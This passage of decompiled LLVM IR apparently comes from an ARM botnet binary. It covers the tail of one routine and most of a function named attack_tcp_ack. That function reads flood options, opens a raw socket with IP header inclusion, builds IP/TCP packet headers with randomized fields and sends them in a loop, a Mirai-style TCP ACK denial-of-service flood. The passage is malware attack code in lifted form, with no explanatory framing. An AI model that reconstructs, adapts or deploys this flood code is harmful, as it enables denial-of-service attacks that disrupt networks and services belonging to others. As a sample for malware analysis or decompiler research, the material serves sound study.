  %v4_a7f0 = inttoptr i32 %v3_a7f0 to i16*
  store i16 %v3_a7e8, i16* %v4_a7f0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @r4, align 4
  store i32 %v0_a7fc, i32* %r1.global-to-local, align 4
  %v0_a800 = load i32, i32* @sb, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  %v0_a804 = load i32, i32* @r7, align 4
  store i32 %v0_a804, i32* %r2.global-to-local, align 4
  %v0_a808 = load i32, i32* @lr, align 4
  %v6_a810 = call i32 @__libc_sendto(i32 %v0_a800, i32 %v0_a7fc, i32 %v0_a804, i32 16384, i32 %v0_a808, i32 16)
  %v3_a814 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a814, i32* %r3.global-to-local, align 4
  %v1_a818 = add i32 %v3_a814, 1
  store i32 %v1_a818, i32* %r0.global-to-local, align 4
  %v0_a81c = load i32, i32* @r6, align 4
  %v9_a81c = icmp eq i32 %v0_a81c, %v1_a818
  store i1 %v9_a81c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a818, i32* %stack_var_-44, align 4
  %v8_a824 = icmp sgt i32 %v0_a81c, %v1_a818
  br i1 %v8_a824, label %dec_label_pc_a730, label %dec_label_pc_a828

dec_label_pc_a828:                                ; preds = %dec_label_pc_a758
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a82c = icmp eq i32 %v0_a81c, 0
  store i1 %v2_a82c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a82c, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a730
  %v0_a83c = call i32 @rand_next()
  %v1_a83c = trunc i32 %v0_a83c to i16
  store i32 %v0_a83c, i32* %r0.global-to-local, align 4
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  %v3_a848 = load i32, i32* @r4, align 4
  %v4_a848 = add i32 %v3_a848, 4
  %v5_a848 = inttoptr i32 %v4_a848 to i16*
  store i16 %v1_a83c, i16* %v5_a848, align 2
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a83c.dec_label_pc_a850_crit_edge

dec_label_pc_a83c.dec_label_pc_a850_crit_edge:    ; preds = %dec_label_pc_a83c
  %v0_a850.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a850

dec_label_pc_a850:                                ; preds = %dec_label_pc_a83c.dec_label_pc_a850_crit_edge, %dec_label_pc_a74c
  %v0_a850 = phi i32 [ %v0_a850.pre, %dec_label_pc_a83c.dec_label_pc_a850_crit_edge ], [ %v7_a738, %dec_label_pc_a74c ]
  %v1_a850 = add i32 %v0_a850, 40
  store i32 %v1_a850, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v2_a858 = inttoptr i32 %v1_a850 to i16*
  %v3_a858 = call i32 @rand_str(i16* %v2_a858, i32 %v6_a250)
  store i32 %v3_a858, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a758

; uselistorder directives
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32 %v1_a818, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7e4, { 1, 0 }
  uselistorder i32 %v4_a7d0, { 1, 0 }
  uselistorder i32 %v3_a79c, { 1, 0 }
  uselistorder i32 %v3_a77c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a768, { 1, 0 }
  uselistorder i1 %v2_a844, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a654, { 1, 0 }
  uselistorder i32 %v0_a58c, { 1, 0 }
  uselistorder i32 %v5_a520, { 1, 0 }
  uselistorder i32 %v0_a4e0, { 1, 0 }
  uselistorder i32 %v0_a49c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a44c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a438, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a3c4, { 1, 0 }
  uselistorder i32 %v6_a3bc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ec, { 1, 0 }
  uselistorder i32 %v4_a400, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a348, { 1, 0, 2 }
  uselistorder i32 %v0_a4f8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a338, { 1, 0 }
  uselistorder i1 %v7_a330, { 1, 0, 2 }
  uselistorder i1 %v7_a2e4, { 1, 0 }
  uselistorder i32 %v3_a2e0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i32 %v1_a690, { 1, 0 }
  uselistorder i32 %v1_a678, { 1, 0 }
  uselistorder i32 %v1_a660, { 1, 0 }
  uselistorder i32 %v3_a3f8, { 1, 0 }
  uselistorder i1 %v2_a414, { 1, 0 }
  uselistorder i32 %v1_a410, { 1, 0 }
  uselistorder i32 %v4_a40c, { 2, 0, 1 }
  uselistorder i32 %v2_a320, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a2bc, { 1, 0 }
  uselistorder i1 %v7_a2b4, { 1, 0 }
  uselistorder i1 %v7_a288, { 1, 0 }
  uselistorder i32 %v3_a284, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a270, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a250, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a238, { 1, 2, 0 }
  uselistorder i32 %v1_a218, { 1, 2, 0 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v6_a174, { 1, 0 }
  uselistorder i32 %v1_a15c, { 1, 2, 0 }
  uselistorder i32 %v6_a0f4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a0dc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a0cc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 61, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 50, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 55, 54, 56, 1, 2, 4, 3, 6, 5, 8, 7, 13, 9, 10, 11, 12, 16, 14, 15, 18, 17, 19, 22, 21, 20, 23, 24, 25, 27, 28, 26, 29, 31, 30, 32, 33, 34, 36, 35, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 23, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 0, 15, 16, 13, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a758, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a71c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a70c, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_a478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
  uselistorder label %dec_label_pc_a340, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_a864 = load i32, i32* @sb, align 4
  %v24_a864 = load i32, i32* @fp, align 4
  %v27_a864 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a880 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a884 = load i32, i32* @r5, align 4
  store i32 %v0_a884, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a894 = load i32, i32* @r4, align 4
  store i32 %v0_a894, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a884 to i32*
  %v6_a898 = call i32 @attack_get_opt_int(i32 %v0_a894, i32* %v5_a898, i32 2, i32 0, i32 %v2_a880)
  %v1_a8a4 = urem i32 %v6_a898, 256
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i32, i32* @r5, align 4
  store i32 %v0_a8b0, i32* %r1.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @r4, align 4
  store i32 %v0_a8b4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a898, 16777216
  %v5_a8bc = sdiv i32 %sext, 16777216
  %v6_a8bc = inttoptr i32 %v0_a8b0 to i32*
  %v7_a8bc = call i32 @attack_get_opt_int(i32 %v0_a8b4, i32* %v6_a8bc, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v5_a8bc)
  %v0_a8c0 = load i32, i32* @r5, align 4
  store i32 %v0_a8c0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8bc, i32* %sb.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d4 = inttoptr i32 %v0_a8c0 to i32*
  %v6_a8d4 = call i32 @attack_get_opt_int(i32 %v0_a8d0, i32* %v5_a8d4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a8dc = urem i32 %v6_a8d4, 256
  store i32 %v1_a8dc, i32* %ip.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r4, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a8d4, 16777216
  %v5_a8f4 = sdiv i32 %sext4, 16777216
  %v6_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8f4 = call i32 @attack_get_opt_int(i32 %v0_a8ec, i32* %v6_a8f4, i32 5, i32 0, i32 %v5_a8f4)
  %v1_a900 = urem i32 %v7_a8f4, 256
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v0_a910 = load i32, i32* @r4, align 4
  store i32 %v0_a910, i32* %r0.global-to-local, align 4
  %v5_a918 = inttoptr i32 %v0_a90c to i32*
  %v6_a918 = call i32 @attack_get_opt_int(i32 %v0_a910, i32* %v5_a918, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_a900)
  %v0_a920 = load i32, i32* @r5, align 4
  store i32 %v0_a920, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a918, i32* @r6, align 4
  %v0_a930 = load i32, i32* @r4, align 4
  store i32 %v0_a930, i32* %r0.global-to-local, align 4
  %v5_a934 = inttoptr i32 %v0_a920 to i32*
  %v6_a934 = call i32 @attack_get_opt_int(i32 %v0_a930, i32* %v5_a934, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_a934, i32* @sl, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  %v5_a950 = inttoptr i32 %v0_a93c to i32*
  %v6_a950 = call i32 @attack_get_opt_int(i32 %v0_a94c, i32* %v5_a950, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_a95c = load i32, i32* @r5, align 4
  store i32 %v0_a95c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a968 = load i32, i32* @r4, align 4
  store i32 %v0_a968, i32* %r0.global-to-local, align 4
  %v5_a96c = inttoptr i32 %v0_a95c to i32*
  %v6_a96c = call i32 @attack_get_opt_int(i32 %v0_a968, i32* %v5_a96c, i32 18, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_a950)
  %v0_a970 = load i32, i32* @r5, align 4
  store i32 %v0_a970, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a980 = load i32, i32* @r4, align 4
  store i32 %v0_a980, i32* %r0.global-to-local, align 4
  %v5_a984 = inttoptr i32 %v0_a970 to i32*
  %v6_a984 = call i32 @attack_get_opt_int(i32 %v0_a980, i32* %v5_a984, i32 11, i32 0, i32 %v6_a96c)
  %v0_a988 = load i32, i32* @r5, align 4
  store i32 %v0_a988, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a998 = load i32, i32* @r4, align 4
  store i32 %v0_a998, i32* %r0.global-to-local, align 4
  %v5_a99c = inttoptr i32 %v0_a988 to i32*
  %v6_a99c = call i32 @attack_get_opt_int(i32 %v0_a998, i32* %v5_a99c, i32 12, i32 1, i32 %v6_a984)
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r4, align 4
  store i32 %v0_a9b0, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @attack_get_opt_int(i32 %v0_a9b0, i32* %v5_a9b4, i32 13, i32 0, i32 %v6_a99c)
  %v0_a9b8 = load i32, i32* @r5, align 4
  store i32 %v0_a9b8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9c8 = load i32, i32* @r4, align 4
  store i32 %v0_a9c8, i32* %r0.global-to-local, align 4
  %v5_a9cc = inttoptr i32 %v0_a9b8 to i32*
  %v6_a9cc = call i32 @attack_get_opt_int(i32 %v0_a9c8, i32* %v5_a9cc, i32 14, i32 0, i32 %v6_a9b4)
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9e0 = load i32, i32* @r4, align 4
  store i32 %v0_a9e0, i32* %r0.global-to-local, align 4
  %v5_a9e4 = inttoptr i32 %v0_a9d0 to i32*
  %v6_a9e4 = call i32 @attack_get_opt_int(i32 %v0_a9e0, i32* %v5_a9e4, i32 15, i32 0, i32 %v6_a9cc)
  %v0_a9e8 = load i32, i32* @r5, align 4
  store i32 %v0_a9e8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_a9f8, i32* %r0.global-to-local, align 4
  %v5_a9fc = inttoptr i32 %v0_a9e8 to i32*
  %v6_a9fc = call i32 @attack_get_opt_int(i32 %v0_a9f8, i32* %v5_a9fc, i32 16, i32 0, i32 %v6_a9e4)
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_aa10 = load i32, i32* @r4, align 4
  store i32 %v0_aa10, i32* %r0.global-to-local, align 4
  %v5_aa14 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa14 = call i32 @attack_get_opt_int(i32 %v0_aa10, i32* %v5_aa14, i32 0, i32 512, i32 %v6_a9fc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r5, align 4
  store i32 %v0_aa24, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* %r0.global-to-local, align 4
  %v5_aa2c = inttoptr i32 %v0_aa24 to i32*
  %v6_aa2c = call i32 @attack_get_opt_int(i32 %v0_aa28, i32* %v5_aa2c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_aa38 = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_aa38, i32* %r3.global-to-local, align 4
  %v1_aa3c = urem i32 %v6_aa2c, 256
  store i32 %v1_aa3c, i32* %ip.global-to-local, align 4
  %v0_aa40 = load i32, i32* @r5, align 4
  store i32 %v0_aa40, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v5_aa50 = inttoptr i32 %v0_aa40 to i32*
  %v6_aa50 = call i32 @attack_get_opt_ip(i32 %v0_aa48, i32* %v5_aa50, i32 25, i32 %v2_aa38, i32 %v1_aa3c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa64 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v7_aa68 = icmp eq i32 %v3_aa64, -1
  store i1 %v7_aa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa68, label %dec_label_pc_af30, label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa7c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa90 = call i32 @__GI_setsockopt(i32 %v3_aa64, i32 0, i32 3, i32 %v6_aa7c, i32 4)
  store i32 %v5_aa90, i32* %r0.global-to-local, align 4
  %v7_aa94 = icmp eq i32 %v5_aa90, -1
  store i1 %v7_aa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa94, label %dec_label_pc_af28, label %dec_label_pc_aa9c

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa74
  %v0_aa9c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa9c = mul i32 %v0_aa9c, 65536
  store i32 %v3_aa9c, i32* @r5, align 4
  %v0_aaa0 = load i32, i32* @r6, align 4
  %v0_aaa4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aaac = urem i32 %v0_aa9c, 65536
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  %v3_aab0 = urem i32 %v0_aaa0, 65536
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v3_aab4 = urem i32 %v0_aaa4, 65536
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v0_aab8 = load i32, i32* @r7, align 4
  %v2_aab8 = icmp eq i32 %v0_aab8, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aab8, label %dec_label_pc_af3c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aa9c
  %v3_aad4 = mul i32 %v6_aa14, 65536
  %v1_aad8 = add i32 %v3_aad4, 2621440
  store i32 %v1_aad8, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aaa0, 256
  %v3_aafc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aaa4, 256
  %v3_ab00 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aaa0, 256
  %v4_ab04 = urem i32 %tmp61, 256
  %v5_ab04 = or i32 %v4_ab04, %v3_aafc
  store i32 %v5_ab04, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aaa4, 256
  %v4_ab08 = urem i32 %tmp62, 256
  %v5_ab08 = or i32 %v4_ab08, %v3_ab00
  store i32 %v5_ab08, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aad8, 256
  %v3_ab1c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa9c, 256
  %v3_ab20 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v6_a950, 256
  %v3_ab24 = and i32 %tmp65, 65280
  %v1_ab28 = urem i32 %v6_a984, 2
  %v1_ab2c = urem i32 %v6_a99c, 2
  %tmp66 = udiv i32 %v6_a950, 256
  %v4_ab30 = urem i32 %tmp66, 256
  %v5_ab30 = or i32 %v4_ab30, %v3_ab24
  %v4_ab34 = udiv i32 %v1_aad8, 16777216
  %v5_ab34 = or i32 %v3_ab1c, %v4_ab34
  store i32 %v5_ab34, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa9c, 256
  %v4_ab38 = urem i32 %tmp67, 256
  %v5_ab38 = or i32 %v4_ab38, %v3_ab20
  store i32 %v5_ab38, i32* @fp, align 4
  %v1_ab54 = urem i32 %v6_a9b4, 2
  store i32 %v1_ab54, i32* %r2.global-to-local, align 4
  %v1_ab58 = urem i32 %v6_a9cc, 2
  store i32 %v1_ab58, i32* %r3.global-to-local, align 4
  %v1_ab5c = urem i32 %v6_a9e4, 2
  store i32 %v1_ab5c, i32* %ip.global-to-local, align 4
  %v1_ab60 = urem i32 %v6_a9fc, 2
  store i32 %v1_ab60, i32* %r0.global-to-local, align 4
  %v1_ab64 = urem i32 %v6_a9b4, 256
  store i32 %v1_ab64, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_ab2c
  %v4_ac50 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab54
  %v4_ac6c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab58
  %v4_ac80 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab5c
  %v3_ac94 = and i32 %tmp74, 2
  %v2_acb8 = icmp eq i32 %v1_ab64, 0
  %v1_abe0 = trunc i32 %v5_a8bc to i8
  %extract.t = trunc i32 %v5_a8f4 to i8
  br label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %bb70, %dec_label_pc_aad0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab90 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ab90, i32* %r0.global-to-local, align 4
  %v2_ab98 = load i32, i32* @r4, align 4
  %v5_ab98 = mul i32 %v2_ab98, 4
  %v6_ab98 = add i32 %v5_ab98, %v2_a880
  %v7_ab98 = inttoptr i32 %v6_ab98 to i32*
  store i32 %v2_ab90, i32* %v7_ab98, align 4
  %v3_ab9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab9c, i32* %r2.global-to-local, align 4
  %v5_aba4 = mul i32 %v3_ab9c, 24
  %v1_aba8 = load i32, i32* @r8, align 4
  %v2_aba8 = add i32 %v1_aba8, %v5_aba4
  store i32 %v2_aba8, i32* %r1.global-to-local, align 4
  store i32 %v2_a880, i32* %r3.global-to-local, align 4
  %v4_abb0 = mul i32 %v3_ab9c, 4
  %v5_abb0 = add i32 %v4_abb0, %v2_a880
  %v6_abb0 = inttoptr i32 %v5_abb0 to i32*
  %v7_abb0 = load i32, i32* %v6_abb0, align 4
  store i32 %v7_abb0, i32* @r5, align 4
  %v1_abb4 = inttoptr i32 %v7_abb0 to i8*
  %v2_abb4 = load i8, i8* %v1_abb4, align 1
  %tmp75 = urem i8 %v2_abb4, 16
  %v1_abb8 = zext i8 %tmp75 to i32
  %v1_abbc = or i32 %v1_abb8, 64
  store i32 %v1_abbc, i32* %r3.global-to-local, align 4
  %v1_abc0 = trunc i32 %v1_abbc to i8
  store i8 %v1_abc0, i8* %v1_abb4, align 1
  %v0_abc4 = load i32, i32* @r5, align 4
  %v1_abc4 = inttoptr i32 %v0_abc4 to i8*
  %v2_abc4 = load i8, i8* %v1_abc4, align 1
  %v1_abc8 = and i8 %v2_abc4, -16
  %v1_abcc = or i8 %v1_abc8, 5
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i8 %v1_abcc, i8* %v1_abc4, align 1
  store i32 %v5_a8bc, i32* %r0.global-to-local, align 4
  %v0_abdc = load i32, i32* %ip.global-to-local, align 4
  %v2_abdc = icmp eq i32 %v0_abdc, 0
  store i1 %v2_abdc, i1* %cpsr_z.global-to-local, align 1
  %v2_abe0 = load i32, i32* @r5, align 4
  %v3_abe0 = add i32 %v2_abe0, 1
  %v4_abe0 = inttoptr i32 %v3_abe0 to i8*
  store i8 %v1_abe0, i8* %v4_abe0, align 1
  store i32 %v5_a8f4, i32* %r2.global-to-local, align 4
  %v0_abe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abe8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab84
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abec = load i32, i32* @r5, align 4
  %v4_abec = add i32 %v3_abec, 6
  %v5_abec = inttoptr i32 %v4_abec to i16*
  store i16 64, i16* %v5_abec, align 2
  %v0_abf4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abf4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab84, %bb
  %v0_abf4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab84 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abf4 = load i32, i32* @r5, align 4
  %v3_abf4 = add i32 %v2_abf4, 8
  %v4_abf4 = inttoptr i32 %v3_abf4 to i8*
  store i8 %v0_abf4.off0, i8* %v4_abf4, align 1
  %v0_abf8 = load i32, i32* %r3.global-to-local, align 4
